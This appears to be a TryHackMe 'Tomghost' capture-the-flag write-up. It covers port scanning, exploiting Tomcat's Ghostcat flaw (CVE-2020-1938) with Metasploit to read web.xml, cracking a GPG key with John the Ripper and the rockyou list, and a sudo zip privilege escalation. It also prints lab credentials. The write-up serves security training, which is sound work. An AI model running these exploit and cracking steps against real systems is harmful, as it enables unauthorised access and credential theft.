# THM - TOMGHOST

## Introduction
Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

We have to get two flags : user.txt and root.txt

## Initial Steps
Opening the page in the web browser doesnt work so it doesnt seem like port 80 is open. I use rustscan to do an initial port scan.
The results are as follows: 
```
[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.159.33:22
Open 10.10.159.33:53
Open 10.10.159.33:8009
Open 10.10.159.33:8080
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-27 23:49 UTC
Initiating Ping Scan at 23:49
Scanning 10.10.159.33 [2 ports]
Completed Ping Scan at 23:49, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:49
Completed Parallel DNS resolution of 1 host. at 23:49, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 23:49
Scanning 10.10.159.33 [4 ports]
Discovered open port 22/tcp on 10.10.159.33
Discovered open port 8080/tcp on 10.10.159.33
Discovered open port 53/tcp on 10.10.159.33
Discovered open port 8009/tcp on 10.10.159.33
Completed Connect Scan at 23:49, 0.28s elapsed (4 total ports)
Nmap scan report for 10.10.159.33
Host is up, received conn-refused (0.28s latency).
Scanned at 2023-12-27 23:49:35 UTC for 0s

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
53/tcp   open  domain     syn-ack
8009/tcp open  ajp13      syn-ack
8080/tcp open  http-proxy syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```
We verify that the Tomcat version is 9.0.30

I also run gobuster to get an idea of what directories are available
We find the following
```
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
```
No new information here.

## Checking CVEs
If we look for any CVEs for Tomcat version 9.0.30 we find this cve 
https://www.cvedetails.com/cve/CVE-2020-1938/.

We see there is a metasploit module for this cve so lets try that

```
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.10.159.33
RHOSTS => 10.10.159.33
msf6 auxiliary(admin/http/tomcat_ghostcat) > show options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   AJP_PORT  8009              no        The Apache JServ Protocol (AJP) port
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS    10.10.159.33      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-
                                         Metasploit
   RPORT     8080              yes       The Apache Tomcat webserver port (TCP)
   SSL       false             yes       SSL

msf6 auxiliary(admin/http/tomcat_ghostcat) > exploit

```

We get a response back with the /WEB-INF/web.xml which contains the following
```
 <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>
```
This looks like a login so lets try it.


## Logged in.
We are logged in an immediately we see there is a credential.pgp and a tryhackme.asc
If we look in the /home we see there is the current user and merlin user. Inside the merlin user there is the user.txt file and luckily we have read access to the file. Its likely that the flag is inside the root folder. Even if it isnt in any case we should try to escalate privileges.

## Privilege Escalation
The two files we have are probably our key in so lets try with those first. These files are an encrypted ssh private key so we will have to crack them using something like JohnTheRipper.

Using the following commands
```
gpg2john tryhackme.asc > hash
john --format=gpg --wordlist=$SECLIST/Passwords/Leaked-Databases/rockyou.txt hash
```
We get this result
```
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2023-12-27 19:42) 14.28g/s 15314p/s 15314c/s 15314C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

alexandru appears to be the password

We import the key into gpg and then decrypted the credentials.pgp file

gpg --import
gpg --descrypt

After decrypting we get this
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

We can use this to login to merlin
Using sudo -l we can see that we can use zip as root
```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Lets zip the root folder and unzip it in the /home/merlin folder

Once this is done we can read the root folder and all of its contents which includes the root.txt file
